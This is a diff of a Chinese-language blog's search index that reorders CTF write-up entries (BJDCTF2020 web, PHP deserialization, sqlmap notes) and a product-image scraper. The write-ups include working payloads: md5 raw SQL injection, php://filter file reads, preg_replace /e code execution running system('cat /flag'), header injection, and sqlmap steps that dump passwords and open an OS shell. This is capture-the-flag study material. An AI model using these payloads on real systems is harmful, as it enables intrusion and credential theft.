@@ -1,98 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BJDCTF2020</title>
-    <url>/2020/09/28/BJDCTF2020/</url>
-    <content><![CDATA[<h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a>
-
-<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12看到了提示，给出了sql语句</p>
-<p><img src="/2020/09/28/BJDCTF2020/md5-1.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs pgsql">Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'admin'</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)</code></pre></div>
-
-<p>这里是将输入的密码进行了一次md5的加密</p>
-<p><strong>md5()函数介绍</strong></p>
-<p><img src="/2020/09/28/BJDCTF2020/md5.png" srcset="/img/loading.gif" alt></p>
-<p>这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。</p>
-<p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p>
-<p>这里经常使用的字符串是<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6&lt;trash&gt;</strong> (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉)</p>
-<p>查询语句为</p>
-<p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>此查询语句结果为真</p>
-<p>提交 ffifdyop后会跳转到另外的页面，查看源码</p>
-<p><img src="/2020/09/28/BJDCTF2020/md5-2.png" srcset="/img/loading.gif" alt></p>
-<p>这里直接利用md5()函数不能处理数组的特性，get提交 <code>?a[]=1&amp;b[]=2</code></p>
-<p>接下来还有一次跳转，直接post <code>param1[]=1&amp;param2[]=2</code>，拿到flag</p>
-<p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" srcset="/img/loading.gif" alt></p>
-<h2 id="不过如此"><a href="#不过如此" class="headerlink" title="不过如此"></a>不过如此</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-
-error_reporting(<span class="hljs-number">0</span>);
-$text = $_GET[<span class="hljs-string">"text"</span>]; <span class="hljs-comment">//get 获取一个参数text 使用data伪协议</span>
-$file = $_GET[<span class="hljs-string">"file"</span>]; <span class="hljs-comment">//file参数，这里可以使用filter伪协议读取php页面源码</span>
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"I have a dream"</span>))&#123;  <span class="hljs-comment">//text 的内容位I have a dream</span>
-  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;
-  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123;                              <span class="hljs-comment">//file参数不能包含flag</span>
-    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not now!"</span>);
-  &#125;
-
-  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php 提示了下一个页面的名字 </span>
-
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-  highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
-
-<p>看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload:</p>
-<p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p>
-<p>对到了index.php页面的base64源码，解码后如下</p>
-<p>index.php</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$id = $_GET[<span class="hljs-string">'id'</span>];
-$_SESSION[<span class="hljs-string">'id'</span>] = $id;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span> </span>&#123;
-    <span class="hljs-keyword">return</span> preg_replace(
-        <span class="hljs-string">'/('</span> . $re . <span class="hljs-string">')/ei'</span>,
-        <span class="hljs-string">'strtolower("\\1")'</span>,
-        $str
-    );
-&#125;
-
-
-<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;
-    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">"\n"</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;
-	@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);
-&#125;</code></pre></div>
-
-<p>利用<strong>preg_replace()使用的/e模式可以存在远程执行代码</strong></p>
-<p>在next.php在输入</p>
-<div class="hljs"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">"cat /flag"</span>);</code></pre></div>
-
-
-
-<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">php伪协议</a></p>
-<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /e模式漏洞详解</a></p>
-<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>进入页面不知道干啥，随便点点，到flag.php时显示了IP地址</p>
-<p>查看原码发现提示<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
-<p>猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1</p>
-<p>这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去</p>
-<p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
-<p> 获取flag:</p>
-<div class="hljs"><pre><code class="hljs clojure">&#123;system(<span class="hljs-string">"cat /flag"</span>)&#125;</code></pre></div>
-
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>md5</tag>
-        <tag>sql</tag>
-        <tag>php伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bugku</title>
     <url>/2020/08/08/Bugku/</url>
     <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><a id="more"></a>
@@ -192,6 +100,98 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre></div><p>0x637466 为十六进制ctf
       </categories>
       <tags>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020</title>
+    <url>/2020/09/28/BJDCTF2020/</url>
+    <content><![CDATA[<h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a>
+
+<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12看到了提示，给出了sql语句</p>
+<p><img src="/2020/09/28/BJDCTF2020/md5-1.png" srcset="/img/loading.gif" alt></p>
+<div class="hljs"><pre><code class="hljs pgsql">Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'admin'</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)</code></pre></div>
+
+<p>这里是将输入的密码进行了一次md5的加密</p>
+<p><strong>md5()函数介绍</strong></p>
+<p><img src="/2020/09/28/BJDCTF2020/md5.png" srcset="/img/loading.gif" alt></p>
+<p>这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。</p>
+<p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p>
+<p>这里经常使用的字符串是<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6&lt;trash&gt;</strong> (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉)</p>
+<p>查询语句为</p>
+<p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>此查询语句结果为真</p>
+<p>提交 ffifdyop后会跳转到另外的页面，查看源码</p>
+<p><img src="/2020/09/28/BJDCTF2020/md5-2.png" srcset="/img/loading.gif" alt></p>
+<p>这里直接利用md5()函数不能处理数组的特性，get提交 <code>?a[]=1&amp;b[]=2</code></p>
+<p>接下来还有一次跳转，直接post <code>param1[]=1&amp;param2[]=2</code>，拿到flag</p>
+<p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" srcset="/img/loading.gif" alt></p>
+<h2 id="不过如此"><a href="#不过如此" class="headerlink" title="不过如此"></a>不过如此</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+error_reporting(<span class="hljs-number">0</span>);
+$text = $_GET[<span class="hljs-string">"text"</span>]; <span class="hljs-comment">//get 获取一个参数text 使用data伪协议</span>
+$file = $_GET[<span class="hljs-string">"file"</span>]; <span class="hljs-comment">//file参数，这里可以使用filter伪协议读取php页面源码</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"I have a dream"</span>))&#123;  <span class="hljs-comment">//text 的内容位I have a dream</span>
+  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="hljs-string">'r'</span>).<span class="hljs-string">"&lt;/h1&gt;&lt;/br&gt;"</span>;
+  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123;                              <span class="hljs-comment">//file参数不能包含flag</span>
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not now!"</span>);
+  &#125;
+
+  <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//next.php 提示了下一个页面的名字 </span>
+
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+  highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload:</p>
+<p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p>
+<p>对到了index.php页面的base64源码，解码后如下</p>
+<p>index.php</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$id = $_GET[<span class="hljs-string">'id'</span>];
+$_SESSION[<span class="hljs-string">'id'</span>] = $id;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span><span class="hljs-params">($re, $str)</span> </span>&#123;
+    <span class="hljs-keyword">return</span> preg_replace(
+        <span class="hljs-string">'/('</span> . $re . <span class="hljs-string">')/ei'</span>,
+        <span class="hljs-string">'strtolower("\\1")'</span>,
+        $str
+    );
+&#125;
+
+
+<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $re =&gt; $str) &#123;
+    <span class="hljs-keyword">echo</span> complex($re, $str). <span class="hljs-string">"\n"</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;
+	@<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]);
+&#125;</code></pre></div>
+
+<p>利用<strong>preg_replace()使用的/e模式可以存在远程执行代码</strong></p>
+<p>在next.php在输入</p>
+<div class="hljs"><pre><code class="hljs awk"><span class="hljs-keyword">next</span>.php?\S*=<span class="hljs-variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="hljs-string">"cat /flag"</span>);</code></pre></div>
+
+
+
+<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">php伪协议</a></p>
+<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /e模式漏洞详解</a></p>
+<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>进入页面不知道干啥，随便点点，到flag.php时显示了IP地址</p>
+<p>查看原码发现提示<code>&lt;!-- Do you know why i know your ip? --&gt;</code></p>
+<p>猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1</p>
+<p>这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去</p>
+<p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
+<p> 获取flag:</p>
+<div class="hljs"><pre><code class="hljs clojure">&#123;system(<span class="hljs-string">"cat /flag"</span>)&#125;</code></pre></div>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>md5</tag>
+        <tag>php伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -457,23 +457,12 @@ print(flag.text)</code></pre></div>]]></content>
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>md5</tag>
         <tag>sql</tag>
+        <tag>md5</tag>
         <tag>弱类型</tag>
         <tag>域名解析</tag>
         <tag>爆破</tag>
         <tag>脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuoj-LFI</title>
-    <url>/2020/10/08/buuoj-LFI/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>LFI</tag>
       </tags>
   </entry>
   <entry>
@@ -650,6 +639,17 @@ $IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*
         <tag>php</tag>
         <tag>cookie</tag>
         <tag>编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuoj-LFI</title>
+    <url>/2020/10/08/buuoj-LFI/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>LFI</tag>
       </tags>
   </entry>
   <entry>
@@ -1645,6 +1645,49 @@ $filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-stri
       </tags>
   </entry>
   <entry>
+    <title>jdtest</title>
+    <url>/2020/07/18/jdtest/</url>
+    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a>
+<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
+<span class="hljs-comment">#@Author : sunzy</span>
+<span class="hljs-comment">#@File : jd.py</span>
+
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> os
+
+dir = <span class="hljs-string">"jdtp"</span>
+<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):
+    os.mkdir(dir)
+
+baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>
+
+head = &#123;
+        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
+    &#125;
+response = requests.get(url=baseurl, headers = head)
+<span class="hljs-comment">#print(response.text)</span>
+html = response.text
+
+findlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span>
+<span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>
+urls = re.findall(findlinks, html)
+
+<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
+    time.sleep(<span class="hljs-number">1</span>)
+    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]
+    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)
+    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
+        f.write(res.content)</code></pre></div>
+]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安作业</title>
     <url>/2020/09/27/homework/</url>
     <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><a id="more"></a>
@@ -1709,6 +1752,35 @@ $filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-stri
       </categories>
       <tags>
         <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap</title>
+    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><a id="more"></a>
+
+<p>第一步:</p>
+<div class="hljs"><pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre></div><p>第二步:</p>
+<div class="hljs"><pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre></div><p>第三步:</p>
+<div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre></div><p>第四步:</p>
+<div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre></div><p>第五步:</p>
+<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
+//探测user表name和password字段</code></pre></div><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
+<p>第六步:</p>
+<div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre></div><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
+<p>group by *</p>
+<p>利用内置函数暴数据库信息</p>
+<p>version() 查看数据库版本</p>
+<p>database() 查看当前数据库名</p>
+<p>user() 查看当前用户</p>
+<p>查看表：</p>
+<div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>可十六进制查看字段：</p>
+<div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre></div>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -1891,126 +1963,6 @@ $result=mysql_query($query);
       </tags>
   </entry>
   <entry>
-    <title>jdtest</title>
-    <url>/2020/07/18/jdtest/</url>
-    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a>
-<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
-<span class="hljs-comment">#@Author : sunzy</span>
-<span class="hljs-comment">#@File : jd.py</span>
-
-<span class="hljs-keyword">import</span> re
-<span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
-<span class="hljs-keyword">import</span> os
-
-dir = <span class="hljs-string">"jdtp"</span>
-<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):
-    os.mkdir(dir)
-
-baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>
-
-head = &#123;
-        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
-    &#125;
-response = requests.get(url=baseurl, headers = head)
-<span class="hljs-comment">#print(response.text)</span>
-html = response.text
-
-findlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span>
-<span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>
-urls = re.findall(findlinks, html)
-
-<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
-    time.sleep(<span class="hljs-number">1</span>)
-    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]
-    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)
-    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
-        f.write(res.content)</code></pre></div>
-]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反序列化</title>
-    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<p>反序列化</p>
-<a id="more"></a>
-<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
-<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
-<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
-<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
-<p>举例说明</p>
-<div class="hljs"><pre><code>&lt;?php
-class Student{
-public $full_name = &apos;zhangsan&apos;;
-public $score = 150;
-public $grades = array();
-
-function __wakeup() {
-echo &quot;__wakeup is invoked&quot;;
-}
-}
-
-$s = new Student();
-var_dump(serialize($s));
-?&gt;</code></pre></div><hr>
-<div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre></div><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
-<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
-<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
-<p>最后执行运行的代码如下:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;
-<span class="hljs-keyword">public</span> $full_name = <span class="hljs-string">'zhangsan'</span>;
-<span class="hljs-keyword">public</span> $score = <span class="hljs-number">150</span>;
-<span class="hljs-keyword">public</span> $grades = <span class="hljs-keyword">array</span>();
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup is invoked"</span>;
-&#125;
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;
-var_dump(<span class="hljs-keyword">$this</span>);
-&#125;
-&#125;
-
-$s = <span class="hljs-keyword">new</span> Student();
-$stu = unserialize(<span class="hljs-string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);
-<span class="hljs-meta">?&gt;</span></code></pre></div>
-
-
-<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;
-<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;
-<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
-&#125;
-?code=</code></pre></div>
-
-<hr>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//定义一个名为xctf的类</span>
-<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">//定义一个公有的类属性$flag，值为111</span>
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span>
-<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);
-&#125;
-&#125;
-$test = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//使用new运算符来实例化该类（xctf）的对象为test</span>
-<span class="hljs-keyword">echo</span>(serialize($test));   <span class="hljs-comment">//输出被序列化的对象（test）</span>
-<span class="hljs-meta">?&gt;</span></code></pre></div>
-<p>输出结果</p>
-<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
-<div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>unserialize</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>nctf</title>
     <url>/2020/08/29/nctf/</url>
     <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><a id="more"></a>
@@ -2150,39 +2102,87 @@ sha1('aa3OFF9m')</code></pre></div>
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>md5</tag>
         <tag>sql</tag>
+        <tag>md5</tag>
         <tag>代码审计</tag>
         <tag>bypass</tag>
       </tags>
   </entry>
   <entry>
-    <title>sqlmap</title>
-    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><a id="more"></a>
+    <title>反序列化</title>
+    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<p>反序列化</p>
+<a id="more"></a>
